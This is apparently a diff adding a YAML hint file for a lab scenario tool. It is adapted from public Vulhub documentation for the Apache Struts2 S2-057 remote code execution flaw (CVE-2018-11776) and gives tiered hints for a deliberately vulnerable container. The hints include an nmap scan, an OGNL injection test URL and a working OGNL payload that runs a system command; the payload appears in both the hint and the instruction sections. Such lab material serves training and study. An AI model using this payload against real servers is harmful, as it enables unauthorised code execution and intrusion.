@@ -1,0 +1,111 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: struts2/s2-057
+cve: CVE-2018-11776
+hint_levels:
+  low:
+  - Inspect the struts2 service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 8080. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): struts2: 8080/tcp → container 8080/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:8080/showcase/`, `http://{{NODE_IP}}:8080/struts2-showcase/`.'
+  high:
+  - |-
+    Vulnerability: Struts2 S2-057 Remote Code Execution Vulnerablity (CVE-2018-11776).
+
+    CVE record(s): https://www.cve.org/CVERecord?id=CVE-2018-11776
+  - |-
+    Exploit
+
+    S2-057 requires the following conditions:
+
+      - `alwaysSelectFullNamespace` is true
+      - The action element does not have the namespace attribute set, or a wildcard is used
+
+    The namespace will be passed by the user from uri and parsed as an OGNL expression, eventually cause remote code execution vulnerablity.
+
+    Payload:
+
+    ```
+    http://{{NODE_IP}}:8080/struts2-showcase/$%7B233*233%7D/actionChain1.action
+    ```
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-057/1.png
+
+    It can be seen that the result of 233*233 has been returned in the Location header.
+
+    Use payload from S2-057 vulnerability analysis and POC: https://mp.weixin.qq.com/s/iBLrrXHvs7agPywVW7TZrg:
+
+    ```
+    ${
+    (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
+    ```
+
+    Result:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-057/2.png
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-057/README.md'
+  - |-
+    Additional public references:
+    - https://cwiki.apache.org/confluence/display/WW/S2-057
+    - https://lgtm.com/blog/apache_struts_CVE-2018-11776
+    - https://xz.aliyun.com/t/2618
+    - https://mp.weixin.qq.com/s/iBLrrXHvs7agPywVW7TZrg
+access_instructions:
+  title: Struts2 S2-057 Remote Code Execution Vulnerablity (CVE-2018-11776)
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 8080. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): struts2: 8080/tcp → container 8080/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:8080/showcase/`, `http://{{NODE_IP}}:8080/struts2-showcase/`.
+  - title: Exploit
+    instructions: |-
+      S2-057 requires the following conditions:
+
+        - `alwaysSelectFullNamespace` is true
+        - The action element does not have the namespace attribute set, or a wildcard is used
+
+      The namespace will be passed by the user from uri and parsed as an OGNL expression, eventually cause remote code execution vulnerablity.
+
+      Payload:
+
+      ```
+      http://{{NODE_IP}}:8080/struts2-showcase/$%7B233*233%7D/actionChain1.action
+      ```
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-057/1.png
+
+      It can be seen that the result of 233*233 has been returned in the Location header.
+
+      Use payload from S2-057 vulnerability analysis and POC: https://mp.weixin.qq.com/s/iBLrrXHvs7agPywVW7TZrg:
+
+      ```
+      ${
+      (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
+      ```
+
+      Result:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-057/2.png
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-057/README.md
+  readme_sha256: a3d2c5847d82bb0bc80b72d8bcc03be079a7c6c51a0a314ca0863caa20e8d249
+  compose_sha256: cc5dc083b0f8f4e6c0800d2df51c561f08f6fcde6326c8df11a670ee6db5491b
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
